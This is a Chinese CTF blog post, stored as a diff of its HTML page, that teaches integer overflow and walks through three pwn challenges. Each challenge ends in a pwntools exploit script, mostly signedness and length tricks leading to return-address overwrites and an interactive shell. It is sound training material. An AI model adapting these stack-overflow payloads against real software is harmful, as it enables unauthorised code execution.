@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.mark0519.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="pwn整数溢出整数溢出原理具体原理​    在 C 语言中，整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，(因为数据类型的大小范围是编译器决定的，所以之后所述都默认是 64 位下使用 gcc-5.4)，当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn整数溢出">
+<meta property="og:url" content="https://blog.mark0519.com/post/pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA.html">
+<meta property="og:site_name" content="Mark&#39;s blog">
+<meta property="og:description" content="pwn整数溢出整数溢出原理具体原理​    在 C 语言中，整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，(因为数据类型的大小范围是编译器决定的，所以之后所述都默认是 64 位下使用 gcc-5.4)，当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/2b0ad190f6187e2d886cefb31556ab673e3a04fe.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/afae5ed583f99d724d404aaeff515d2f23d15061.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bc437d2cf2843f22c5853067e1caed0fa836194c.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/b5efb7544a2bd617a9be8ec601cbbb40ca79e9d4.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/743f07915787a751331bae9ce87e0feb25e6a94a.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/500e04fb9ea10fe74c6c5b0bdfd1ad52dacb399c.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d6b5560104d1c0681659e20aa6663c3ebf0e49d3.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/76a6cb4493cfe0c4ef4e0b5c2055a8f88cdcfc4f.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/5f3ccf452e0bcf3dc5d697038616801e74ef585f.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/495a914ed8834f34a49e0bcf7ffc02badbe090b9.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/ba79c6f648519d0357a7bea5f500784f0cd29a40.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/5f5b23c5c9b377972d3f22ce424d44b363d0d555.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a6e5da8d24384845f823330bb49e0cd91e12a0da.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d5e567216626e19399368b99e84bb62bb1e58113.png">
+<meta property="og:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/c05a97398e9d9d740f15ca12c7e3a7c22f845250.png">
+<meta property="article:published_time" content="2021-01-09T07:17:19.000Z">
+<meta property="article:modified_time" content="2021-01-28T14:19:57.141Z">
+<meta property="article:author" content="Mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/2b0ad190f6187e2d886cefb31556ab673e3a04fe.png">
+
+<link rel="canonical" href="https://blog.mark0519.com/post/pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwn整数溢出 | Mark's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mark's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.mark0519.com/post/pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+      <meta itemprop="name" content="Mark0519">
+      <meta itemprop="description" content="菜鸡CTFer的自留地">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mark's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn整数溢出
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-09 15:17:19" itemprop="dateCreated datePublished" datetime="2021-01-09T15:17:19+08:00">2021-01-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-28 22:19:57" itemprop="dateModified" datetime="2021-01-28T22:19:57+08:00">2021-01-28</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="pwn整数溢出"><a href="#pwn整数溢出" class="headerlink" title="pwn整数溢出"></a>pwn整数溢出</h1><h2 id="整数溢出原理"><a href="#整数溢出原理" class="headerlink" title="整数溢出原理"></a>整数溢出原理</h2><h3 id="具体原理"><a href="#具体原理" class="headerlink" title="具体原理"></a>具体原理</h3><p>​    在 C 语言中，整数的基本数据类型分为短整型 (short)，整型 (int)，长整型 (long)，这三个数据类型还分为有符号和无符号，每种数据类型都有各自的大小范围，(因为数据类型的大小范围是编译器决定的，所以之后所述都默认是 64 位下使用 gcc-5.4)，当程序中的数据超过其数据类型的范围，则会造成溢出，整数类型的溢出被称为整数溢出。</p>
+<span id="more"></span>
+
+<p>具体数据类型的范围如下：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>字节</th>
+<th>范围</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>short int</td>
+<td>2byte(word)</td>
+<td>-32768~32767</td>
+</tr>
+<tr>
+<td>unsigned short int</td>
+<td>2byte(word)</td>
+<td>0<del>65535(0</del>0xffff)</td>
+</tr>
+<tr>
+<td>int</td>
+<td>4byte(dword)</td>
+<td>-2147483648~2147483647</td>
+</tr>
+<tr>
+<td>unsigned int</td>
+<td>4byte(dword)</td>
+<td>0<del>4294967295(0</del>0xffffffff)</td>
+</tr>
+<tr>
+<td>long int</td>
+<td>8byte(qword)</td>
+<td>正: 0<del>0x7fffffffffffffff 负: 0x8000000000000000</del>0xffffffffffffffff</td>
+</tr>
+<tr>
+<td>unsigned long int</td>
+<td>8byte(qword)</td>
+<td>0~0xffffffffffffffff</td>
+</tr>
+</tbody></table>
+<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> var1 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> var2 <span class="token operator">=</span> <span class="token number">65537</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">==</span> var2<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"溢出"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>输出结果</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/2b0ad190f6187e2d886cefb31556ab673e3a04fe.png"></p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/afae5ed583f99d724d404aaeff515d2f23d15061.png"></p>
+<h2 id="WUST-CTF-number-game"><a href="#WUST-CTF-number-game" class="headerlink" title="WUST-CTF number_game"></a>WUST-CTF number_game</h2><p>武汉科技大学的ctf萌新赛，是我在找这个方面的题目时发现的，考查整数溢出的知识</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>反汇编elf文件</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/bc437d2cf2843f22c5853067e1caed0fa836194c.png"></p>
+<p>可以看到是需要输入一个数小于0，取反之后再次小于0即可得到shell</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/b5efb7544a2bd617a9be8ec601cbbb40ca79e9d4.png"></p>
+<p>由于v1是int型，故最多表示4,294,967,296个数，含有符号，即表示</p>
+<p><strong>-2147483648~2147483647</strong></p>
+<p>故可取v1 = -2147483648</p>
+<p>则v1取符号后仍未负数</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'.\number_game'</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147483648</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#注意，sendline发送的都为字符型数据，要想发送数字得加上str()函数</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h2 id="攻防世界int-overflow"><a href="#攻防世界int-overflow" class="headerlink" title="攻防世界int_overflow"></a>攻防世界int_overflow</h2><p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/743f07915787a751331bae9ce87e0feb25e6a94a.png"></p>
+<p>连接：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5058&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=pwn&amp;number=2&amp;grade=0&amp;id=5058&amp;page=1</a></p>
+<h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>附件checkesc分析</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/500e04fb9ea10fe74c6c5b0bdfd1ad52dacb399c.png"></p>
+<p>没有开启canary保护，可以使用栈溢出的漏洞</p>
+<p>接着使用IDApro分析</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d6b5560104d1c0681659e20aa6663c3ebf0e49d3.png"></p>
+<p>main函数中没有什么问题</p>
+<p>接着检查login（）函数</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/76a6cb4493cfe0c4ef4e0b5c2055a8f88cdcfc4f.png"></p>
+<p>检查check_passwd()函数：</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/5f3ccf452e0bcf3dc5d697038616801e74ef585f.png"></p>
+<p>注意变量v3，这里就会存在整数溢出漏洞</p>
+<p>对输入的数字s的长度限制在4-8位之间，但是v3为unsigned int8型变量，即为无符号的8bits大小整数</p>
+<p>最大值应该为255：</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/495a914ed8834f34a49e0bcf7ffc02badbe090b9.png"></p>
+<p>如果超出255，就会溢出，即对于unsigned int8型的变量v1和v2，如果v1=0,v2=256；则v1==v2;</p>
+<p>故此题的输入密码的长度应为 4 ~ 8 或 255+4 ~ 255+8</p>
+<p>找到漏洞后，按shift+f12查找关键字</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/ba79c6f648519d0357a7bea5f500784f0cd29a40.png"></p>
+<p>即发现cat flag关键字</p>
+<p>即发现函数</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/5f5b23c5c9b377972d3f22ce424d44b363d0d555.png"></p>
+<p>查看地址</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/a6e5da8d24384845f823330bb49e0cd91e12a0da.png"></p>
+<p>得到函数的starts地址，即可在输入passwd时构造字符将chack_passwd的函数返回地址改为what_is_this()函数的地址</p>
+<p>且由于dest变量到栈底的偏移量为0x14，故即可构造exp</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+c<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'220.249.52.134'</span><span class="token punctuation">,</span><span class="token number">36374</span><span class="token punctuation">)</span>
+
+flag_adress<span class="token operator">=</span><span class="token number">0x804868B</span>
+
+payload<span class="token operator">=</span><span class="token string">"zbrnb"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x14</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>flag_adress<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"zbrnb"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span><span class="token number">0x14</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>
+
+c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your choice:"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Please input your username:\n"</span><span class="token punctuation">,</span><span class="token string">"Retr_0nb"</span><span class="token punctuation">)</span>
+c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your passwd:\n"</span><span class="token punctuation">)</span>
+c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+c<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>即可得到flag</p>
+<h2 id="BUUCTF-bjdctf-2020-babystack2"><a href="#BUUCTF-bjdctf-2020-babystack2" class="headerlink" title="BUUCTF[bjdctf_2020_babystack2]"></a>BUUCTF[bjdctf_2020_babystack2]</h2><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>反汇编分析</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/d5e567216626e19399368b99e84bb62bb1e58113.png"></p>
+<p>即发现<strong>在if判断时nbytes时，nbytes是signed int 而执行read函数时为unsigned int型</strong></p>
+<p>故如果输入nbytes时输入 -1 ，在if判断时为负数 &lt;10,而执行read函数时为最大值，可以输入更多的字符</p>
+<p>且发现漏洞函数</p>
+<p><img src="https://images.weserv.nl/?url=https://i0.hdslb.com/bfs/article/c05a97398e9d9d740f15ca12c7e3a7c22f845250.png"></p>
+<p>通过gdb调试计算buf的偏移量，得到<code>payload=&#39;a&#39;*(0x10+8)+p64(shell_addr)</code></p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment">#sh = process('./bjdctf_2020_babystack2')</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token string">"25761"</span><span class="token punctuation">)</span>
+shell_addr <span class="token operator">=</span> <span class="token number">0x0000000000400726</span>
+
+payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"of your name:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"-1"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"s u name?"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/leetcode-136-%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97.html" rel="prev" title="leetcode.136.只出现一次的数字">
+      <i class="fa fa-chevron-left"></i> leetcode.136.只出现一次的数字
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/pwn-%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%BC%8F%E6%B4%9E%E2%80%9C.html" rel="next" title="pwn-随机数漏洞">
+      pwn-随机数漏洞 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-number">1.</span> <span class="nav-text">pwn整数溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">整数溢出原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.1.</span> <span class="nav-text">具体原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BE%E4%BE%8B"><span class="nav-number">1.1.2.</span> <span class="nav-text">举例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WUST-CTF-number-game"><span class="nav-number">1.2.</span> <span class="nav-text">WUST-CTF number_game</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.2.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.2.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cint-overflow"><span class="nav-number">1.3.</span> <span class="nav-text">攻防世界int_overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-bjdctf-2020-babystack2"><span class="nav-number">1.4.</span> <span class="nav-text">BUUCTF[bjdctf_2020_babystack2]</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mark0519"
+      src="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+  <p class="site-author-name" itemprop="name">Mark0519</p>
+  <div class="site-description" itemprop="description">菜鸡CTFer的自留地</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mark0519</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
